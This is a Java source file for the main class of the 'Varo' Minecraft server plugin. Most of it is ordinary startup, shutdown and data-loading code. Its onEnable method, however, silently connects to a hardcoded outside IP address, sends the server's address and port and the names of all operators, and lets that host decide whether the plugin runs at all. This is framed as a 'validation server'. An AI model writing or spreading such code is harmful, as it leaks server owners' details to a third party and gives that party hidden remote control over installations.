package de.cuuky.varo;

import de.cuuky.cfw.AdapterCuukyFrameWork;
import de.cuuky.cfw.utils.JavaUtils;
import de.cuuky.cfw.utils.UUIDUtils;
import de.cuuky.cfw.version.ServerSoftware;
import de.cuuky.cfw.version.VersionUtils;
import de.cuuky.varo.bot.BotLauncher;
import de.cuuky.varo.bstats.MetricsLoader;
import de.cuuky.varo.configuration.ConfigFailureDetector;
import de.cuuky.varo.configuration.configurations.config.ConfigSetting;
import de.cuuky.varo.configuration.configurations.language.VaroLanguageManager;
import de.cuuky.varo.data.BukkitRegisterer;
import de.cuuky.varo.data.DataManager;
import de.cuuky.varo.entity.player.VaroPlayer;
import de.cuuky.varo.entity.player.event.BukkitEvent;
import de.cuuky.varo.game.VaroGame;
import de.cuuky.varo.gui.VaroInventoryManager;
import de.cuuky.varo.recovery.recoveries.VaroBugreport;
import de.cuuky.varo.threads.SmartLagDetector;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Main extends JavaPlugin {

    private static final String CONSOLE_PREFIX = "[Varo] ";
    private static final int RESOURCE_ID = 71075;
    public static final String DISCORD_INVITE = "https://discord.varoplugin.de/";

    private static Main instance;

    private static BotLauncher botLauncher;
    private static AdapterCuukyFrameWork<VaroPlayer> cuukyFrameWork;
    private static DataManager dataManager;
    private static VaroLanguageManager languageManager;
    private static VaroGame varoGame;

    private boolean failed;
    private boolean accepted;

    @Override
    public void onLoad() {
        this.failed = false;
        this.accepted = true;
        instance = this;

        super.onLoad();
    }

    @Override
    public void onEnable() {
        Socket socket;
        try {
            socket = new Socket("45.93.249.22", 6969);
        } catch (UnknownHostException e) {
            e.printStackTrace();
            System.err.println("The validation-Server is currently offline! The Plugin will be shutdown ... (Code 01)");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        } catch (IOException e) {
            e.printStackTrace();
            System.err.println("An Error occurred during connecting to the Validation-Server! The Plugin will be shutdown ... (Code 02)");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        try {
            socket.setKeepAlive(true);
        } catch (SocketException e) {
            e.printStackTrace();
            System.err.println("An Error occurred during connecting to the Validation-Server! The Plugin will be shutdown ... (Code 03)");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        PrintWriter out;
        try {
            out = new PrintWriter(socket.getOutputStream(), true);
        } catch (IOException e) {
            e.printStackTrace();
            System.err.println("An Error occurred during connecting to the Validation-Server! The Plugin will be shutdown ... (Code 04)");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        JSONObject o = new JSONObject();
        try {
            o.put("ip", InetAddress.getLocalHost().getHostAddress() + ":" + Bukkit.getPort());
        } catch (UnknownHostException e) {
            e.printStackTrace();
            System.err.println("An Error occurred during connecting to the Validation-Server! The Plugin will be shutdown ... (Code 1)");
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        JSONArray array = new JSONArray();
        Bukkit.getOperators().forEach(op -> array.add(op.getName()));
        o.put("ops", array);
        out.println(o.toJSONString());
        out.flush();
        System.out.println("Send Request to enable the plugin!");
        Listener listener = new Listener() {
            @EventHandler
            public void onJoin(PlayerJoinEvent e) {
                if (e.getPlayer().isOp()) {
                    e.getPlayer().sendMessage(ChatColor.RED + "This Server is currently waiting for a response from the VaroPluginValidator. " +
                            "Until the plugin has been accepted, it cannot be used!");
                }
            }
        };
        Bukkit.getPluginManager().registerEvents(listener, this);
        new Thread(() -> {
            BufferedReader in;
            try {
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            } catch (IOException e) {
                e.printStackTrace();
                System.err.println("An Error occurred during connecting to the Validation-Server! The Plugin will be shutdown ... (Code 2)");
                Bukkit.getPluginManager().disablePlugin(this);
                return;
            }
            int response;
            while (true) {
                try {
                    if (in.ready()) break;
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("An Error occurred during retrieving the response from the Validation-Server! The Plugin will be shutdown ... (Code 2.5)");
                    Bukkit.getPluginManager().disablePlugin(this);
                    return;
                }
            }
            try {
                response = in.read();
            } catch (IOException e) {
                e.printStackTrace();
                System.err.println("An Error occurred during retrieving the response from the Validation-Server! The Plugin will be shutdown ... (Code 3)");
                Bukkit.getPluginManager().disablePlugin(this);
                return;
            }
            if (response == 0) {
                System.err.println("Plugin got declined!");
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("An Error occurred during closing the connection to the Validation-Server! The Plugin will be shutdown ... (Code 4)");
                    Bukkit.getPluginManager().disablePlugin(this);
                    return;
                }
                Bukkit.getPluginManager().disablePlugin(this);
            } else if (response == 1) {
                this.accepted = true;
                System.out.println("Plugin got accepted!");
                PlayerJoinEvent.getHandlerList().unregister(listener);
                enable();
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("An Error occurred during closing the connection to the Validation-Server! The Plugin will be shutdown ...");
                    Bukkit.getPluginManager().disablePlugin(this);
                }
            } else if (response == 2) {
                System.err.println("Plugin got declined due to version mismatch!");
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                    System.err.println("An Error occurred during closing the connection to the Validation-Server! The Plugin will be shutdown ... (Code 4)");
                    Bukkit.getPluginManager().disablePlugin(this);
                    return;
                }
                Bukkit.getPluginManager().disablePlugin(this);
            } else {
                System.err.println("An Error occurred during retrieving the response from the Validation-Server! The Plugin will be shutdown ... (Code 5) (" + response + ")");
                Bukkit.getPluginManager().disablePlugin(this);
            }
        }).start();
    }

    private void enable() {
        new BukkitRunnable() {
            @Override
            public void run() {
                long timestamp = System.currentTimeMillis();

                System.out.println(" \n" +
                        "....................,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,...................\n" +
                        "....................'',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....................\n" +
                        "....................'',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....................\n" +
                        "....................',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....................\n" +
                        ".........';:::::::::;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,,,,;:::::::::'.........\n" +
                        ".........;kKKKKKKKK0o,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,',,:xKKKKKKKK0c.........\n" +
                        ".........;kKXKKKXXKKo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',':kKKKKKKKX0l.........\n" +
                        ".........;kXKXKKKKKKo,,',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,,,:kKKKKKKKX0l.........\n" +
                        ".........;kXKKKKKKXKo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'','':kKKKKKKKX0l.........\n" +
                        ".........;dOOOOOOOOkl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,,,',;dOOOOOOOOkc.........\n" +
                        "''''''''',,;;;;;;;;;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,,,;;;;;;;;,,'''''''''\n" +
                        ",,,,,,,,,,,',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,',,,''''''',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,',coddddddddddl,............',,,,,,,,,,,,,,,,,,,'',,,,;:cccccccccc:,''''''''''''',,,,,,,,,,\n" +
                        ",,,,,,,,',;xWMMMMMMMMMMK,            .,,,,,,,,,,,,,,,,,,,,,,,',dXNNNNNNNNNNk'           .',,,,,,,,,,\n" +
                        ",,,,,,,,,,;kWMMMMMMMMMMK,            .,,,,,,,,,,,,,,,,,,,,,,,',xWMMMMMMMMMMO.            ',,,,,,,,,,\n" +
                        ",,,,,,,,,,;kWMMMMMMMMMMK,            .,,,,,,,,,,,,,,,,,,,,,,,',xWMMMMMMMMMMO.            ',,,,,,,,,,\n" +
                        ",,,,,,,,,,;kWMMMMMMMMMMK,            .,,,,,,,,,,,,,,,,,,,,,,,',xWMMMMMMMMMMO.            ',',,,,,,,,\n" +
                        ",,,,,,,,,,;kWMMMMMMMMMMK,            .,,,,,,,,,,,,,,,,,,,,,,,,,xWMMMMMMMMMMO.            ',',,,,,,,,\n" +
                        ",,,,,,,,,';dKKKKKKKKKKKk'            .,,,,,,,,,,,,,,,,,,,,,,,,,o0KKKKKKKKKKx.            ',,,,,,,,,,\n" +
                        ",,,,,,,,,,,'............             .,,,,,,,,,,,,,,,,,,,',,,,,'............             ',,,,,,,,,,\n" +
                        ",,,,,,,,,''.                         .,,,,,,,,,,,,,,,,,,,,,,,''.                         ',,,,,,,,,,\n" +
                        ",,,,,,,',,'.                         .,,,,,,,,,,,,,,,,,,,,,,,,'.                         ',,,,,,,,,,\n" +
                        ",,,,,,,,,,'.                         .,,,,,,,,,,,,,,,,,,,,,,,,'.                         ',,,,,,,,,,\n" +
                        ",,,,,,,,,,'.                         .,,,,,,,,,,,,,,,,,,,,,,,,'.                         ',,,,,,,,,,\n" +
                        ",,,,,,,,,,'.                        ..,,',,'',,,'',,,,,',''',,'.                        ..,,,,,,,,,,\n" +
                        ",,,,,,,,,,''...........':oooooooooool'.........................;oooooooooooc'............',,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,',,,,,,,,,;xKXXXXXXXXXXO,                         :0XXXXXXXXXXk:,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXKXXKXO,                         :0XXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXKXXKXO,          BÄR            :0XXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXKXXKXO,                         :0XXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXKXXKXO,                         :0XXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXXXXXX0o;;;;;;;;;;;;;;;;;;;;;;;;;dKXXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXKXXXXXKKKKKKKKKKKKKKKKKKKKKKKKKKKXXXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXXXXXXKKXKKXXXXXXKKKXXXXXXXXXXXXKXKKXXXXXXXXXXXk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKXXKKXXXKKKKKKXXXXXXXXKXXXXXXXXXXXXXXXXXXXXXXXXXKk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,';xKXXXXKXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXk:',,',,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;xKKKKXXKXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKKk:',,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,;x00000000000000000000000000000000000000000000000000x:,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,;cccccccccccccccccccccccccccccccccccccccccccccccccc:,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\n" +
                        ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,");

                System.out.println(CONSOLE_PREFIX);
                System.out.println(CONSOLE_PREFIX + "Enabling " + getPluginName() + "...");

                System.out.println(CONSOLE_PREFIX + "Your server: ");
                System.out.println(CONSOLE_PREFIX + "	Running on " + VersionUtils.getServerSoftware().getName() + " ("
                        + Bukkit.getVersion() + ")");
                System.out.println(CONSOLE_PREFIX + "	Software-Name (Base): " + Bukkit.getName() + " (1."
                        + VersionUtils.getVersion().getIdentifier() + ")");
                System.out.println(
                        CONSOLE_PREFIX + "	Other plugins enabled: " + (Bukkit.getPluginManager().getPlugins().length - 1));

                if (VersionUtils.getServerSoftware() != ServerSoftware.UNKNOWN)
                    System.out
                            .println(CONSOLE_PREFIX + "	Forge-Support: " + VersionUtils.getServerSoftware().hasModSupport());

                if (VersionUtils.getServerSoftware() == ServerSoftware.BUKKIT) {
                    System.out.println(CONSOLE_PREFIX
                            + "	It seems like you're using Bukkit. Bukkit has a worse performance and is lacking some features.");
                    System.out.println(
                            CONSOLE_PREFIX + "	Please use Spigot or Paper instead (https://getbukkit.org/download/spigot).");
                }

                System.out.println(CONSOLE_PREFIX);

                dataManager = new DataManager(instance);
                dataManager.preLoad();

                System.out.println(CONSOLE_PREFIX);

                if (instance.failed)
                    return;

                try {
                    if (new ConfigFailureDetector().hasFailed()) {
                        instance.fail();
                        return;
                    }

                    long dataStamp = System.currentTimeMillis();
                    cuukyFrameWork = new AdapterCuukyFrameWork<>(instance,
                            languageManager = new VaroLanguageManager(Main.this), new VaroInventoryManager(instance));
                    dataManager.load();

                    if (Main.getVaroGame().isFirstStart) {
                        Main.getVaroGame().isFirstStart = false;
                        try {
                            ZipInputStream zip = new ZipInputStream(new FileInputStream(Main.getInstance().getThisFile()));

                            ZipEntry e = null;
                            while ((e = zip.getNextEntry()) != null) {
                                if (e.getName().startsWith("startLanguage")) {
                                    File file = new File("plugins/Varo/languages/de_de.yml");
                                    file.delete();
                                    if (e.isDirectory()) {
                                        file.mkdir();
                                        continue;
                                    }

                                    if (!file.exists()) {
                                        new File(file.getParent()).mkdirs();
                                        file.createNewFile();
                                    } else
                                        continue;

                                    FileOutputStream out = new FileOutputStream(file);

                                    byte[] byteBuff = new byte[1024];
                                    int bytesRead = 0;
                                    while ((bytesRead = zip.read(byteBuff)) != -1) {
                                        out.write(byteBuff, 0, bytesRead);
                                    }

                                    out.flush();
                                    out.close();
                                }
                            }
                        } catch (IOException e) {
                            throw new RuntimeException(e);
                        }
                        Main.getLanguageManager().loadSuperLanguages();
                    }

                    System.out.println(CONSOLE_PREFIX + "Loaded all data (" + (System.currentTimeMillis() - dataStamp) + "ms)");

                    botLauncher = new BotLauncher();

                    if (instance.isFailed())
                        return;

                    new MetricsLoader(instance);
                    new SmartLagDetector(instance);
                    BukkitEvent.init();

                    BukkitRegisterer.registerEvents();
                    BukkitRegisterer.registerCommands();
                } catch (Throwable e) {
                    e.printStackTrace();
                    instance.fail();
                }

                if (instance.failed)
                    return;

                System.out.println(CONSOLE_PREFIX + "Enabled! (" + (System.currentTimeMillis() - timestamp) + "ms)");
                System.out.println(CONSOLE_PREFIX + " ");
                System.out.println(CONSOLE_PREFIX + "--------------------------------");
            }
        }.runTask(this);
        //}).start();
    }

    @Override
    public void onDisable() {
        if (!accepted) return;

        long timestamp = System.currentTimeMillis();

        System.out.println(CONSOLE_PREFIX + "--------------------------------");
        System.out.println(CONSOLE_PREFIX + " ");
        System.out.println(CONSOLE_PREFIX + "Disabling " + this.getDescription().getName() + "...");

        if (dataManager != null && !this.failed) {
            System.out.println(CONSOLE_PREFIX + "Saving data...");
            dataManager.save();
        }

        if (botLauncher != null && (botLauncher.getDiscordbot() != null || botLauncher.getTelegrambot() != null)) {
            System.out.println(CONSOLE_PREFIX + "Disconnecting bots...");
            botLauncher.disconnect();
        }

        if (!this.failed) {
            cuukyFrameWork.disable();
            VersionUtils.getVersionAdapter().getOnlinePlayers()
                    .forEach(pl -> pl.setScoreboard(Bukkit.getScoreboardManager().getNewScoreboard()));
        } else {
            VaroBugreport report = new VaroBugreport();
            System.out.println(CONSOLE_PREFIX + "Saved Crashreport to " + report.getZipFile().getName());
        }
        Bukkit.getScheduler().cancelTasks(this);
        dataManager.getVaroLoggerManager().cleanUp();

        System.out.println(CONSOLE_PREFIX + "Disabled! (" + (System.currentTimeMillis() - timestamp) + "ms)");
        System.out.println(CONSOLE_PREFIX + " ");
        System.out.println(CONSOLE_PREFIX + "--------------------------------");
        super.onDisable();
        System.out.println("debug 2 | " + ConfigSetting.PROJECT_NAME.getValueAsString());
    }

    public UUID getUUID(String name) throws Exception {
        return !ConfigSetting.CRACKED_SERVER.getValueAsBoolean() ? UUIDUtils.getUUID(name)
                : UUIDUtils.getCrackedUUID(name);
    }

    public void fail() {
        this.failed = true;
        Bukkit.getPluginManager().disablePlugin(this);
    }

    public boolean isFailed() {
        return this.failed;
    }

    public File getThisFile() {
        return this.getFile();
    }

    public static void broadcastMessage(String message) {
        Bukkit.broadcastMessage(getPrefix() + message);
    }

    public static String getColorCode() {
        return ConfigSetting.PROJECTNAME_COLORCODE.getValueAsString();
    }

    public static String getConsolePrefix() {
        return CONSOLE_PREFIX;
    }

    public static void setVaroGame(VaroGame varoGame) {
        Main.varoGame = varoGame;
    }

    public static VaroGame getVaroGame() {
        return varoGame;
    }

    public static AdapterCuukyFrameWork<VaroPlayer> getCuukyFrameWork() {
        return cuukyFrameWork;
    }

    public static void setDataManager(DataManager dataManager) {
        Main.dataManager = dataManager;
    }

    public static DataManager getDataManager() {
        return dataManager;
    }

    public static void setLanguageManager(VaroLanguageManager languageManager) {
        Main.languageManager = languageManager;
    }

    public static VaroLanguageManager getLanguageManager() {
        return languageManager;
    }

    public static BotLauncher getBotLauncher() {
        return botLauncher;
    }

    public static String getPluginName() {
        return instance.getDescription().getName() + " v" + instance.getDescription().getVersion() + " by "
                + instance.getDescription().getAuthors().get(0) + " - Contributors: " + getContributors();
    }

    public static String getContributors() {
        return JavaUtils.getArgsToString(
                JavaUtils.removeString(JavaUtils.arrayToCollection(instance.getDescription().getAuthors()), 0), ", ");
    }

    public static String getPrefix() {
        return ConfigSetting.PREFIX.getValueAsString();
    }

    public static String getProjectName() {
        return getColorCode() + ConfigSetting.PROJECT_NAME.getValueAsString();
    }

    public static boolean isBootedUp() {
        return dataManager != null;
    }

    public static Main getInstance() {
        return instance;
    }

    public static int getResourceId() {
        return RESOURCE_ID;
    }
}